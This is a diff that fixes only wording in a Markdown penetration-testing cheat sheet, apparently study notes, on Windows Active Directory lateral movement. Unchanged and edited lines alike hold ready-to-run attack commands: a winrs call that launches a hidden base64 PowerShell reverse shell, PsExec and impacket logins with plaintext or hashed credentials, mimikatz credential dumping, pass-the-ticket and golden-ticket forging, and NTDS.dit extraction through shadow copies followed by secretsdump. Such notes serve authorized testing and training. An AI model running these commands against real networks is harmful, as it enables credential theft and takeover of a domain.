@@ -3,17 +3,17 @@
 ## Winrs
 
 ```shell
-# add the base64-encoded powershell reverse shell
-winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e <enconded_rs>"
+# add the base64-encoded PowerShell reverse shell
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e <encoded_rs>"
 ```
 
 ## PsExec.exe
 
 **Requirements**:
 
-- the user that authenticates to the target machine needs to be part of the Administrators local group
-- the _ADMIN$_ share must be available (enabled by default)
-- file and printer sharing has to be turned on (on by default)
+- The user that authenticates to the target machine needs to be part of the Administrators local group.
+- The _ADMIN$_ share must be available (enabled by default).
+- File and printer sharing has to be turned on (on by default)
 
 ```shell
 ./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
@@ -42,9 +42,9 @@ evil-winrm -i <ip>/<domain> -u <user> -p <pass> -s <script.ps1>
 
 **Requirements**:
 
-- an SMB connection through the firewall (commonly port 445)
-- the Windows File and Printer Sharing feature to be enabled
-- the admin share called **ADMIN$** to be available
+- An SMB connection through the firewall (commonly port 445).
+- The Windows File and Printer Sharing feature must be enabled.
+- The admin share called **ADMIN$** must be available.
 
 ```shell
 # psexec
@@ -67,9 +67,9 @@ impacket-atexec -hashes <hash:hash> <domain>/<user>@<IP> <command>
 # get hashes with mimikatz
 privilege::debug
 sekurlsa::logonpasswords
-# generate kerberos ticket
+# generate Kerberos ticket
 sekurlsa::pth /user:Administrator /domain:<domain> /ntlm:<hash>
-# verify Kerberos Ticket
+# verify Kerberos ticket
 klist
 
 # access the resource
@@ -84,9 +84,9 @@ dir \\<target>\C$
 # export tickets with mimikatz
 privilege::debug
 sekurlsa::tickets /export
-# import it with the current user
+# import it as the current user
 kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<rhost>.LOCAL.kirbi
-# verify Kerberos Ticket
+# verify Kerberos ticket
 klist
 
 # access the resource
@@ -136,10 +136,10 @@ kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1
 
 # spawn a cmd as the new user
 misc::cmd
-# or launch a psexec.exe
+# or launch psexec.exe
 PsExec.exe \\dc1 cmd.exe
 
-# linux
+# Linux
 impacket-ticketer -aesKey <key> -domain-sid <sid> -domain <domain> -extra-sid <parent_sid> <user> -extra-pac
 
 # import the TGT
@@ -149,7 +149,7 @@ export KRB5CCNAME=<user>.ccache
 impacket-psexec -k -no-pass <domain>/<username>@<hostname>.<domain>
 ```
 
-To get the parent domain (if needed) and use it in `-extra-sid`:
+To get the parent domain (if needed), use it in `-extra-sid`:
 
 ```shell
 .\mimikatz.exe "lsadump::trust /patch" "exit"
@@ -172,13 +172,13 @@ vshadow.exe -nw -p C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
 # get system
 reg.exe save hklm\system c:\system.bak
-# user secretsdump to get the hashes
+# use secretsdump to get the hashes
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
 ### diskshadow
 
-First we set a **shadowcopy.txt** instructions in which we are creating a volume with an alias as seen [here](https://pentestlab.blog/tag/diskshadow/)
+First, set up a **shadowcopy.txt** instructions file in which you create a volume with an alias as seen [here](https://pentestlab.blog/tag/diskshadow/):
 
 ```shell
 set context persistent nowriters
